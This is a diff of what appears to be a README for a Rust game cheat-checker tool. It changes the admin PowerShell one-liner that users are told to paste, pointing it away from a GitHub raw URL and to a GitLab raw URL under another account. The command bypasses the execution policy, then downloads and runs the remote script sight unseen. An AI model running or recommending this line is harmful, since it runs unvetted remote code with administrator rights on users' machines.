@@ -14,4 +14,4 @@
 Run PowerShell **as Administrator**, then copy and paste this single line:
 
 ```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://raw.githubusercontent.com/AsyncFlow200/Rust-Protection-Suite/refs/heads/main/RustCheatChecker.ps1' -UseBasicParsing).Content
+Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://gitlab.com/femdaun/Rust-Protection-Suite/-/raw/main/RustCheatChecker.ps1?ref_type=heads' -UseBasicParsing).Content
